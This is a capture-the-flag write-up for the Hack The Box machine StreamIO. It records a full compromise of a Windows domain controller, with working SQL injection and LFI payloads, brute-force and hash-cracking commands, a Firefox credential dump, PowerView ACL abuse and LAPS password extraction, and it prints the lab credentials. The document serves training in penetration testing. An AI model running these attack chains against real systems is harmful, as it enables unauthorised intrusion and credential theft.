# HTB - StreamIO

**IP Address:** `10.10.11.158`  
**OS:** Windows  
**Difficulty:** Medium  
**Tags:** #SMB, #Kerberos, #MSSQL, #SQLi, #LFI, #RFI, #PHP, #FirefoxCredentialDump, #LAPS, #WinRM, #BloodHound, #PrivEsc

---

## Summary

StreamIO is a Windows-based Active Directory machine that requires thorough enumeration of web services, exploitation of SQL injection vulnerabilities, local and remote file inclusions, and post-exploitation analysis using tools like BloodHound and PowerView. The attacker pivots from initial web access to administrative privileges through chained credentials, MSSQL abuse, browser data extraction, and LAPS misconfigurations.

---

## 1. Host and Port Scanning

### 1.1 ICMP Discovery

```bash
ping -c 1 10.10.11.158
```

✅ Host is alive.

### 1.2 TCP Port Scan

Performed a fast full TCP scan:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.158 -oG allPorts
```

Then ran a targeted version detection scan on discovered ports:

```bash
nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49703 10.10.11.158 -oN targeted
```

✅ Open ports indicate a Windows domain controller with SMB, Kerberos, LDAP, and MSSQL.

---

## 2. Web Reconnaissance and Host Discovery

Two domains were identified:

- `streamio.htb`
    
- `watch.streamio.htb`
    

Added to `/etc/hosts`:

```
10.10.11.158 streamio.htb watch.streamio.htb
```

### 2.1 Website Observation

The homepage of `streamio.htb` reveals a video streaming platform. It includes user testimonials and an “Our Team” section listing names:

- Barry
    
- Oliver
    
- Samantha
    
- Johan
    

These were extracted for user enumeration.

---

## 3. Kerberos User Enumeration

### 3.1 Initial Enumeration with Extracted Names

Names were saved in a file `users.txt` and tested using `kerbrute`:

```bash
kerbrute userenum --dc 10.10.11.158 -d streamio.htb users
```

❌ No valid usernames found.

### 3.2 Bruteforce with SecLists Dictionary

Tried a broader dictionary to identify users from SecLists:

```bash
kerbrute userenum --dc 10.10.11.158 -d streamio.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
```

✅ Found valid user: `martin@streamio.htb`

### 3.3 AS-REP Roasting Check

Checked if the user was AS-REP roastable:

```bash
GetNPUsers.py streamIO.htb/ -no-pass -usersfile valid_users
```

❌ Not vulnerable.

---

## 4. Web Content Discovery & SQL Injection

### 4.1 Fuzzing on `streamio.htb`

Used `wfuzz` to identify hidden PHP endpoints:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://streamio.htb/FUZZ.php
```

❌ No significant results.

### 4.2 Switched to `watch.streamio.htb`

Ran same fuzzing strategy on second domain:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://watch.streamio.htb/FUZZ.php
```

✅ Found endpoint `/search.php`

### 4.3 SQLi Discovery

Confirmed union-based SQL injection:

```sql
' union select 1,2,3,4,5,6-- -
```

Enumerated database:

```sql
' union select 1,concat(username,':',password),3,4,5,6 from users-- -
```

Collected MD5 hashes.

Cracked using `john`:

```bash
john --format=Raw-MD5 -w:/usr/share/wordlists/rockyou.txt hashes
```

✅ Several plaintext credentials recovered.

---

## 5. Credential Validation and LFI

### 5.1 Validating Credentials via SMB

Used `crackmapexec` with the cracked credentials:

```bash
crackmapexec smb 10.10.11.158 -u users -p passwords --no-bruteforce
```

❌ None of the credentials worked for SMB access.

### 5.2 Web Login Attempt

Used `hydra` to brute-force login on `streamio.htb`:

```bash
hydra -C valid_credentials streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

✅ Logged in as `yoshihide`

### 5.3 LFI Exploitation

Found `/admin/?debug=` endpoint which is vulnerable to Local File Inclusion:

```text
/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```

Decoded with `base64` and identified hardcoded DB credentials:

```
db_admin : B1@hx31234567890
```

---

## 6. MSSQL Database Enumeration

Logged into MSSQL using the extracted credentials via `sqlcmd`:

```bash
sqlcmd -U db_admin -P B1@hx31234567890 -S localhost -d streamio_backup
```

Enumerated users and their hashes from the backup database:

```sql
SELECT username, password FROM users;
```

Cracked with John:

```bash
john --format=Raw-MD5 -w:/usr/share/wordlists/rockyou.txt backup_credentials
```

✅ Found:

```
nikk37 : get_dem_girls2@yahoo.com
```

---

## 7. Remote Access via WinRM

Checked WinRM permissions:

```bash
crackmapexec winrm 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
```

✅ Access confirmed. Logged in:

```bash
evil-winrm -i 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
```

🏁 User flag retrieved.

---

## 8. Credential Dump from Firefox

Identified a Firefox profile in:

```bash
C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\
```

Downloaded `key4.db` and `logins.json`, and decrypted using `firepwd`:

```bash
python3 firepwd.py
```

✅ Recovered multiple credentials, including:

```
JDgodd : JDg0dd1s@d0p3cr3@t0r
```

---

## 9. BloodHound & LAPS Abuse

Used `SharpHound` to generate data for BloodHound.

Found path: `JDgodd → Core Staff → LAPS → Administrator`.

Used `PowerView.ps1` to escalate JDgodd to Core Staff:

```powershell
Import-Module .\PowerView.ps1
$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity 'JDgodd'
Add-DomainGroupMember -Identity 'Core Staff' -Members 'JDgodd' -Credential $cred
```

Used LDAP to retrieve the LAPS password:

```bash
ldapsearch -x -H ldap://10.10.11.158 -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' -b "dc=streamio,dc=htb" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

✅ Retrieved password:

```
Administrator : 5GpNlBb8E6&Ha)
```

---

## 10. Administrator Access

Connected using Evil-WinRM:

```bash
evil-winrm -i 10.10.11.158 -u 'Administrator' -p '5GpNlBb8E6&Ha)'
```

🏁 Root flag obtained from Martin's desktop.

---

# ✅ MACHINE FULLY ROOTED